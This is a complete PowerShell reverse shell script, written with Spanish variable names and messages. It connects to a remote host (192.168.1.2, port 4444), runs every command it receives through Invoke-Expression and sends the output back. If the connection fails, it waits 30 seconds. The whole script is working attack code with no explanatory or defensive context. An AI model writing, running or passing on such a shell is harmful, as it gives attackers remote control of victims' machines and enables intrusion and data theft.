$ip_remota = "192.168.1.2"
$puerto_remoto = 4444

try {
    $socket = New-Object System.Net.Sockets.TCPClient($ip_remota, $puerto_remoto)

    $stream = $socket.GetStream()
    $lector = New-Object System.IO.StreamReader($stream)
    $escritor = New-Object System.IO.StreamWriter($stream)

    $escritor.WriteLine("[+] Conexión recibida. Shell listo.")
    $escritor.Flush()

    while ($true) {
        $escritor.Write("Shell> ")
        $escritor.Flush()

           $comando = $lector.ReadLine()

           if ($comando -eq "exit") {
            break
        }

           $resultado = try {
            Invoke-Expression $comando 2>&1 | Out-String
        } catch {
            "Error ejecutando el comando: $_"
        }

         $escritor.WriteLine($resultado)
        $escritor.Flush()
    }

    $escritor.Close()
    $lector.Close()
    $socket.Close()
}
catch {
    Start-Sleep -Seconds 30
}
